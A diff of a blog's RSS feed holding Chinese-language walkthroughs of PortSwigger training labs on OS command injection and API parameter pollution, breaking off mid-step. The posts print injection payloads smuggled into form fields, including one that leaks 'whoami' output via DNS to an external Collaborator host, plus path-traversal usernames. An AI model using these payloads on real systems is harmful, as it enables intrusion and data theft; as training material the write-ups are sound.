@@ -1,4 +1,429 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Portswigger on Terminal</title><link>/tags/portswigger/</link><description>Recent content in Portswigger on Terminal</description><generator>Hugo -- gohugo.io</generator><language>en</language><lastBuildDate>Mon, 09 Dec 2024 22:32:44 +0800</lastBuildDate><atom:link href="/tags/portswigger/index.xml" rel="self" type="application/rss+xml"/><item><title>[Write Up]Lab: Referer-based access control</title><link>/posts/2024/access-control-lab-referer-based-access-control/</link><pubDate>Mon, 09 Dec 2024 22:32:44 +0800</pubDate><guid>/posts/2024/access-control-lab-referer-based-access-control/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Portswigger on Terminal</title><link>/tags/portswigger/</link><description>Recent content in Portswigger on Terminal</description><generator>Hugo -- gohugo.io</generator><language>en</language><lastBuildDate>Sun, 15 Dec 2024 22:06:11 +0800</lastBuildDate><atom:link href="/tags/portswigger/index.xml" rel="self" type="application/rss+xml"/><item><title>[Write Up]Lab: Blind OS command injection with out-of-band data exfiltration</title><link>/posts/2024/os-command-injection-lab-blind-out-of-band-data-exfiltration/</link><pubDate>Sun, 15 Dec 2024 22:06:11 +0800</pubDate><guid>/posts/2024/os-command-injection-lab-blind-out-of-band-data-exfiltration/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2024/os-command-injection-lab-blind-out-of-band-data-exfiltration-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2024/os-command-injection-lab-blind-out-of-band-data-exfiltration-1.jpg">&lt;/p>
+&lt;h2 id="solution">Solution&lt;/h2>
+&lt;ol>
+&lt;li>点击右上方&lt;code>Submit feedback&lt;/code>进行反馈页面，填写资料后点击最下方&lt;code>Submit feedback&lt;/code>，对应Request
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /feedback/submit &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>csrf=bRTAA5qKvCP2saW0Q4UKkfI6HyvGQBOh&amp;amp;name=1&amp;amp;email=email%40emai.com&amp;amp;subject=1&amp;amp;message=1
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>使用Burp Collaborator产生Collaborator server&lt;code>301sbrcuqw9gnbrep0w1dmr0frlj99xy.oastify.com&lt;/code>&lt;/li>
+&lt;li>修改&lt;code>email&lt;/code>参数
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /feedback/submit &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>csrf=WjvWEJJjtVfpMJPsv274zP7r7KhFTrpe&amp;amp;name=1&amp;amp;email=x||nslookup+`whoami`.301sbrcuqw9gnbrep0w1dmr0frlj99xy.oastify.com||&amp;amp;subject=1&amp;amp;message=1
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">200&lt;/span> &lt;span style="color:#a6e22e">OK&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{}
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>发送请求后回到Burp Collaborator查看到DNS lookup记录，&lt;code>peter-jA42w0&lt;/code>即为&lt;code>whoami&lt;/code>的执行结果
+&lt;img alt="DNS lookup" src="/img/2024/os-command-injection-lab-blind-out-of-band-data-exfiltration-2.jpg">&lt;/li>
+&lt;li>返回页面点击最上方的&lt;code>Submit solution&lt;/code>并输入&lt;code>peter-jA42w0&lt;/code>，即可解题&lt;/li>
+&lt;/ol></content></item><item><title>[Write Up]Lab: Blind OS command injection with out-of-band interaction</title><link>/posts/2024/os-command-injection-lab-blind-out-of-band/</link><pubDate>Sun, 15 Dec 2024 21:54:43 +0800</pubDate><guid>/posts/2024/os-command-injection-lab-blind-out-of-band/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2024/os-command-injection-lab-blind-out-of-band-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2024/os-command-injection-lab-blind-out-of-band-1.jpg">&lt;/p>
+&lt;h2 id="solution">Solution&lt;/h2>
+&lt;ol>
+&lt;li>点击右上方&lt;code>Submit feedback&lt;/code>进行反馈页面，填写资料后点击最下方&lt;code>Submit feedback&lt;/code>，对应Request
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /feedback/submit &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>csrf=WjvWEJJjtVfpMJPsv274zP7r7KhFTrpe&amp;amp;name=1&amp;amp;email=email%40email.com&amp;amp;subject=1&amp;amp;message=1
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>使用Burp Collaborator产生Collaborator server&lt;code>oskd3c4fih11fwjzhlom57jl7cd31tpi.oastify.com&lt;/code>&lt;/li>
+&lt;li>修改&lt;code>email&lt;/code>参数为&lt;code>x||nslookup+oskd3c4fih11fwjzhlom57jl7cd31tpi.oastify.com||&lt;/code>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /feedback/submit &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>csrf=WjvWEJJjtVfpMJPsv274zP7r7KhFTrpe&amp;amp;name=1&amp;amp;email=x||nslookup+oskd3c4fih11fwjzhlom57jl7cd31tpi.oastify.com||&amp;amp;subject=1&amp;amp;message=1
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">200&lt;/span> &lt;span style="color:#a6e22e">OK&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{}
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>发送请求后回到Burp Collaborator查看到DNS lookup记录
+&lt;img alt="DNS lookup" src="/img/2024/os-command-injection-lab-blind-out-of-band-2.jpg">&lt;/li>
+&lt;li>返回页面并刷新后，即可解题&lt;/li>
+&lt;/ol></content></item><item><title>[Write Up]Lab: Blind OS command injection with output redirection</title><link>/posts/2024/os-command-injection-lab-blind-output-redirection/</link><pubDate>Sun, 15 Dec 2024 21:37:30 +0800</pubDate><guid>/posts/2024/os-command-injection-lab-blind-output-redirection/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2024/os-command-injection-lab-blind-output-redirection-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2024/os-command-injection-lab-blind-output-redirection-1.jpg">&lt;/p>
+&lt;h2 id="solution">Solution&lt;/h2>
+&lt;ol>
+&lt;li>点击右上方&lt;code>Submit feedback&lt;/code>进行反馈页面，填写资料后点击最下方&lt;code>Submit feedback&lt;/code>，对应Request
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /feedback/submit &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>csrf=hWJPoizsRhwEmqpWy4YhB0OnDapdOJdV&amp;amp;name=1&amp;amp;email=email%40email.com&amp;amp;subject=1&amp;amp;message=1
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>修改&lt;code>email&lt;/code>参数为&lt;code>x||whoami&amp;gt;/var/www/images/output.txt||&lt;/code>，发送请求后即可解题
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /feedback/submit &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>csrf=v4rsJZlcJqDgYyINUfgiUM8uglmcIZtH&amp;amp;name=1&amp;amp;email=x||whoami&amp;gt;/var/www/images/output.txt||&amp;amp;subject=1&amp;amp;message=1
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">200&lt;/span> &lt;span style="color:#a6e22e">OK&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{}
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>参考图片请求，将上述输出路径设置入url&lt;code>/image?filename=output.txt&lt;/code>，即可解题
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-text" data-lang="text">&lt;span style="display:flex;">&lt;span>peter-00pfjq
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;/ol></content></item><item><title>[Write Up]Lab: Blind OS command injection with time delays</title><link>/posts/2024/os-command-injection-lab-blind-time-delays/</link><pubDate>Sun, 15 Dec 2024 21:28:55 +0800</pubDate><guid>/posts/2024/os-command-injection-lab-blind-time-delays/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2024/os-command-injection-lab-blind-time-delays-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2024/os-command-injection-lab-blind-time-delays-1.jpg">&lt;/p>
+&lt;h2 id="solution">Solution&lt;/h2>
+&lt;ol>
+&lt;li>点击右上方&lt;code>Submit feedback&lt;/code>进行反馈页面，填写资料后点击最下方&lt;code>Submit feedback&lt;/code>，对应Request
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /feedback/submit &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>csrf=hWJPoizsRhwEmqpWy4YhB0OnDapdOJdV&amp;amp;name=1&amp;amp;email=email%40email.com&amp;amp;subject=1&amp;amp;message=1
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>修改&lt;code>email&lt;/code>参数为&lt;code>x||ping+-c+10+127.0.0.1||&lt;/code>，发送请求后即可解题
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /feedback/submit &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>csrf=hWJPoizsRhwEmqpWy4YhB0OnDapdOJdV&amp;amp;name=1&amp;amp;email=x||ping+-c+10+127.0.0.1||&amp;amp;subject=1&amp;amp;message=1
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;/ol></content></item><item><title>[Write Up]Lab: OS command injection, simple case</title><link>/posts/2024/os-command-injection-lab-simple/</link><pubDate>Sun, 15 Dec 2024 21:17:18 +0800</pubDate><guid>/posts/2024/os-command-injection-lab-simple/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2024/os-command-injection-lab-simple-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2024/os-command-injection-lab-simple-1.jpg">&lt;/p>
+&lt;h2 id="solution">Solution&lt;/h2>
+&lt;ol>
+&lt;li>随机点击一个商品的&lt;code>View details&lt;/code>&lt;/li>
+&lt;li>点击商品详细页最下方的&lt;code>Check stock&lt;/code>，对应Request
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /product/stock &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>productId=1&amp;amp;storeId=1
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>修改参数&lt;code>storeId&lt;/code>为&lt;code>1|whoami&lt;/code>，发送请求后即可解题
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /product/stock &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>productId=1&amp;amp;storeId=1|whoami
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">200&lt;/span> &lt;span style="color:#a6e22e">OK&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>peter-KhbIuP
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;/ol></content></item><item><title>[Write Up]Lab: Exploiting server-side parameter pollution in a REST URL</title><link>/posts/2024/api-testing-lab-exploiting-server-side-parameter-pollution-in-rest-url/</link><pubDate>Sun, 15 Dec 2024 19:54:33 +0800</pubDate><guid>/posts/2024/api-testing-lab-exploiting-server-side-parameter-pollution-in-rest-url/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2024/api-testing-lab-exploiting-server-side-parameter-pollution-in-rest-url-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2024/api-testing-lab-exploiting-server-side-parameter-pollution-in-rest-url-1.jpg">&lt;/p>
+&lt;h2 id="solution">Solution&lt;/h2>
+&lt;ol>
+&lt;li>点击右上角&lt;code>My account&lt;/code>进入登录页面，点击&lt;code>Forgot password?&lt;/code>&lt;/li>
+&lt;li>输入&lt;code>administrator&lt;/code>后点击&lt;code>Submit&lt;/code>，对应Request
+&lt;img alt="Lab description" src="/img/2024/api-testing-lab-exploiting-server-side-parameter-pollution-in-rest-url-2.jpg">
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /forgot-password &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>csrf=ggMJHz5JIKl90W1Q9yAVGrfX17FHMXfF&amp;amp;username=administrator
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>在上述Request送出时，会获得&lt;code>javascript&lt;/code>，当中包含代码片段，说明若url中包含&lt;code>reset-token&lt;/code>参数则跳转到&lt;code>/forgot-password?passwordResetToken=${resetToken}&lt;/code>，否则为当前场景下看到的页面
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-javascript" data-lang="javascript">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">forgotPwdReady&lt;/span>(() =&amp;gt; {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#a6e22e">queryString&lt;/span> &lt;span style="color:#f92672">=&lt;/span> window.&lt;span style="color:#a6e22e">location&lt;/span>.&lt;span style="color:#a6e22e">search&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#a6e22e">urlParams&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> &lt;span style="color:#a6e22e">URLSearchParams&lt;/span>(&lt;span style="color:#a6e22e">queryString&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#a6e22e">resetToken&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">urlParams&lt;/span>.&lt;span style="color:#a6e22e">get&lt;/span>(&lt;span style="color:#e6db74">&amp;#39;reset-token&amp;#39;&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#a6e22e">resetToken&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> window.&lt;span style="color:#a6e22e">location&lt;/span>.&lt;span style="color:#a6e22e">href&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">`/forgot-password?passwordResetToken=&lt;/span>&lt;span style="color:#e6db74">${&lt;/span>&lt;span style="color:#a6e22e">resetToken&lt;/span>&lt;span style="color:#e6db74">}&lt;/span>&lt;span style="color:#e6db74">`&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#a6e22e">forgotPasswordBtn&lt;/span> &lt;span style="color:#f92672">=&lt;/span> document.&lt;span style="color:#a6e22e">getElementById&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;forgot-password-btn&amp;#34;&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">forgotPasswordBtn&lt;/span>.&lt;span style="color:#a6e22e">addEventListener&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;click&amp;#34;&lt;/span>, &lt;span style="color:#a6e22e">displayMsg&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>});
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>下述开始通过猜测&lt;code>POST /forgot-password&lt;/code>的Request body来获得&lt;code>reset_token&lt;/code>
+&lt;ol>
+&lt;li>尝试使用URL编码(&lt;code>#&lt;/code>)截断服务器端查询字符串&lt;/li>
+&lt;/ol>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /forgot-password &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>csrf=ggMJHz5JIKl90W1Q9yAVGrfX17FHMXfF&amp;amp;username=administrator%23
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">404&lt;/span> &lt;span style="color:#a6e22e">Not Found&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;#34;type&amp;#34;: &amp;#34;error&amp;#34;,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;#34;result&amp;#34;: &amp;#34;Invalid route. Please refer to the API definition&amp;#34;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="2">
+&lt;li>尝试使用&lt;code>?&lt;/code>截断URL路径&lt;/li>
+&lt;/ol>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /forgot-password &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>csrf=ggMJHz5JIKl90W1Q9yAVGrfX17FHMXfF&amp;amp;username=administrator%3f
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">404&lt;/span> &lt;span style="color:#a6e22e">Not Found&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;#34;type&amp;#34;: &amp;#34;error&amp;#34;,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;#34;result&amp;#34;: &amp;#34;Invalid route. Please refer to the API definition&amp;#34;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="3">
+&lt;li>尝试使用&lt;code>./administrator&lt;/code>作为&lt;code>username&lt;/code>参数值&lt;/li>
+&lt;/ol>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /forgot-password &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>csrf=ggMJHz5JIKl90W1Q9yAVGrfX17FHMXfF&amp;amp;username=./administrator
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">200&lt;/span> &lt;span style="color:#a6e22e">OK&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{&amp;#34;type&amp;#34;:&amp;#34;email&amp;#34;,&amp;#34;result&amp;#34;:&amp;#34;*****@normal-user.net&amp;#34;}
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="4">
+&lt;li>尝试使用&lt;code>../administrator&lt;/code>作为&lt;code>username&lt;/code>参数值&lt;/li>
+&lt;/ol>
